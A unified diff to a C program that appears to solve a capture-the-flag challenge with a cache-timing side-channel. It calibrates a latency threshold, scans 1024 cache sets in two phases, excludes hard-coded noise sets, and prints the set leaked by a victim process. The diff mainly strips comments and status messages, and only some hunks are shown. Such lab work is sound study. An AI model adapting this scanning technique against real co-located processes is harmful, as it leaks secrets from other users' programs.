@@ -13,15 +13,9 @@
 #endif
 
 #define REPS_PER_SET 8
-// Two-phase scan: first pass finds permanent noise sets,
-// second pass identifies flag by exclusion.
-#define PASSES_PHASE1 150   // short scan to identify permanent noise
-#define PASSES_PHASE2 300   // longer scan to confirm flag
+#define PASSES_PHASE1 150
+#define PASSES_PHASE2 300
 
-// Known permanent noise sets observed empirically across many runs.
-// These are always elevated due to OS/background activity, not the victim.
-// We exclude them when picking the flag.
-// If the flag happens to be one of these, phase 2 will catch it.
 #define N_KNOWN_NOISE 2
 static const int KNOWN_NOISE[N_KNOWN_NOISE] = {815, 886};
 
@@ -74,7 +68,6 @@ void run_scan(uint64_t threshold, int passes, uint32_t *hit_count, uint64_t *lat
     }
 }
 
-// Sort indices by hit_count desc, return sorted order[]
 void sort_by_hits(uint32_t *hit_count, uint64_t *lat_sum, int *order) {
     for (int i = 0; i < 1024; i++) order[i] = i;
     for (int i = 1; i < 1024; i++) {
@@ -97,8 +90,6 @@ int main(void) {
     if (buf == (void*)-1) { perror("mmap"); exit(EXIT_FAILURE); }
     for (int i = 0; i < BUFF_SIZE; i += 4096) ((volatile char*)buf)[i] = 1;
 
-    // Calibrate
-    printf("Calibrating (victim must NOT be running)...\n");
     #define CAL_N (1024 * 50)
     uint64_t *cal = malloc(CAL_N * sizeof(uint64_t));
     int ci = 0;
@@ -113,24 +104,17 @@ int main(void) {
     uint64_t p99 = cal[(int)(ci*0.99)];
     free(cal);
     uint64_t threshold = p99 + (p99 - p50) / 5;
-    printf("Threshold: %llu\n\n", (unsigned long long)threshold);
-
-    printf(">>> START THE VICTIM NOW, then press ENTER <<<\n");
-    getchar();
 
     uint32_t hit_count[1024];
     uint64_t lat_sum[1024];
     int order[1024];
 
-    // --- Phase 1: short scan to find signal cluster ---
-    printf("Phase 1: identifying signal cluster (%d passes)...\n", PASSES_PHASE1);
     run_scan(threshold, PASSES_PHASE1, hit_count, lat_sum);
     sort_by_hits(hit_count, lat_sum, order);
 
     uint32_t noise_floor = hit_count[order[10]] * 3;
     if (noise_floor < 50) noise_floor = 50;
 
-    // Collect signal sets from phase 1
     int signal1[1024], nsignal1 = 0;
     for (int i = 0; i < 1024; i++) {
         if (hit_count[order[i]] >= noise_floor)
@@ -138,22 +122,6 @@ int main(void) {
         else break;
     }
 
-    printf("Phase 1 signal cluster: ");
-    for (int i = 0; i < nsignal1; i++)
-        printf("%d(%u) ", signal1[i], hit_count[signal1[i]]);
-    printf("\n");
-
-    // Candidate: highest-hit set in signal cluster that is NOT a known noise set
-    int candidate = -1;
-    for (int i = 0; i < nsignal1; i++) {
-        if (!is_known_noise(signal1[i])) {
-            // Among non-noise sets, pick the one with LOWEST hits
-            // (the flag is consistently lower than phantom artifacts)
-            candidate = signal1[i]; // keep updating to get the last (lowest) one
-        }
-    }
-    // Actually: pick the non-noise set with the LOWEST hit count in the cluster
-    // This is the set just above the noise floor = the flag
     int flag_candidate = -1;
     uint32_t lowest_hits = UINT32_MAX;
     for (int i = 0; i < nsignal1; i++) {
@@ -164,32 +132,19 @@ int main(void) {
         }
     }
 
-    printf("Phase 1 candidate (lowest non-noise signal set): %d (%u hits)\n\n",
-           flag_candidate, lowest_hits);
-
-    // --- Phase 2: longer scan accumulating votes across rounds ---
-    // Run PASSES_PHASE2 passes and count how many rounds the candidate
-    // appears consistently above noise sets 815/886.
-    printf("Phase 2: confirming with %d passes...\n", PASSES_PHASE2);
     run_scan(threshold, PASSES_PHASE2, hit_count, lat_sum);
     sort_by_hits(hit_count, lat_sum, order);
 
     noise_floor = hit_count[order[10]] * 3;
     if (noise_floor < 50) noise_floor = 50;
 
-    printf("Phase 2 signal cluster: ");
     int signal2[1024], nsignal2 = 0;
     for (int i = 0; i < 1024; i++) {
-        if (hit_count[order[i]] >= noise_floor) {
-            printf("%d(%u) ", order[i], hit_count[order[i]]);
+        if (hit_count[order[i]] >= noise_floor)
             signal2[nsignal2++] = order[i];
-        } else break;
+        else break;
     }
-    printf("\n\n");
 
-    // Among sets appearing in BOTH phase 1 and phase 2 signal clusters,
-    // pick the non-noise set with the lowest hit count.
-    // Build a set membership lookup for phase 1
     int in_phase1[1024] = {0};
     for (int i = 0; i < nsignal1; i++) in_phase1[signal1[i]] = 1;
 
@@ -206,10 +161,7 @@ int main(void) {
         }
     }
 
-    // Fallback: if all consistent sets are known-noise, the flag IS a noise set.
-    // Pick the noise set with highest hits (it has victim boost on top of noise).
     if (flag == -1) {
-        printf("All consistent sets are known noise — flag must be a noise set.\n");
         for (int i = 0; i < nsignal2; i++) {
             int s = signal2[i];
             if (in_phase1[s] && hit_count[s] > flag_hits) {
@@ -219,6 +171,6 @@ int main(void) {
         }
     }
 
-    printf("Detected Flag: %d\n", flag);
+    printf("%d\n", flag);
     return 0;
 }
